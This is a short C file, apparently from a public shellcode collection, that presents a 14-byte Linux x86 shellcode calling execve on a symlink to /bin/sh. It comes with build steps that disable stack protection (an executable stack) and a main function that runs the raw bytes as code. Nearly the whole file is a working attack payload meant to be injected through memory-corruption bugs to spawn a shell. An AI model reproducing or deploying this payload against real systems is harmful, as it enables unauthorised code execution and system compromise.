#include <stdio.h>
#include <string.h>

/*
	by Magnefikko
	17.04.2010
	magnefikko@gmail.com
	Promhyl Studies :: http://promhyl.oz.pl
	Subgroup: #PRekambr
	Name: 14 bytes execve("a->/bin/sh") local-only shellcode
	Platform: Linux x86

	execve("a", 0, 0);

	$ ln -s /bin/sh a
	$ gcc -Wl,-z,execstack filename.c
	$ ./a.out

	Link is required.

	shellcode:

\x31\xc0\x50\x6a\x61\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80

*/


int main(){
	char shell[] = "\x31\xc0\x50\x6a\x61\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80";
	printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n", strlen(shell));
	(*(void (*)()) shell)();
}